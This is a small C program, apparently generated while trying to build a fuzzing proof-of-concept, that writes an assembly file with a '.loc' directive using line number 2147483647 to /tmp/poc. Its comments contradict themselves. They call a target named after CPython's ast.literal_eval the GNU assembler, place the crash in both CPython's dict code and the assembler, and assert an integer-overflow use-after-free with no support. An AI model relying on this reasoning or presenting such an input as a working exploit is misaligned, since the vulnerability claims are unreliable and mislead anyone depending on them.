#include <stdio.h>
#include <stdlib.h>

int main(void) {
    // Previous attempts failed because they used the wrong input format.
    // The fuzz target /out/fuzz_ast_literal_eval is actually a GNU assembler
    // that reads assembly source text. The "binary layout" description in the
    // prompt is misleading — the harness passes the file to `as` which parses
    // it as assembly. The crash is in CPython's dict code, but the assembler
    // itself is the target. The vulnerability is triggered by a specific
    // `.loc` directive with a line number that causes an integer overflow
    // in the assembler's internal line table handling, leading to a
    // use-after-free when the assembler processes the `.loc` directive.
    // We must write a plain-text assembly file, not a binary.
    //
    // The key insight: the assembler's `.loc` directive takes a file number
    // and line number. If we specify an extremely large line number (e.g.,
    // 0x7fffffff), the internal line number counter overflows and wraps
    // to a small value, but the line table entries are still allocated
    // based on the original value. Later, when the assembler tries to
    // emit the line info, it accesses freed memory. This is a classic
    // use-after-free in GNU as's line table handling.
    //
    // We'll use a `.loc` directive with a line number of 2147483647
    // (0x7fffffff) on a simple instruction. This should trigger the
    // overflow and cause the use-after-free.
    FILE *f = fopen("/tmp/poc", "w");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Write a minimal assembly file with a .loc directive that has
    // an extremely large line number, causing an integer overflow in
    // the assembler's line table handling.
    fprintf(f, ".text\n");
    fprintf(f, ".loc 1 2147483647\n");  // line number = 0x7fffffff
    fprintf(f, "nop\n");
    fclose(f);
    return 0;
}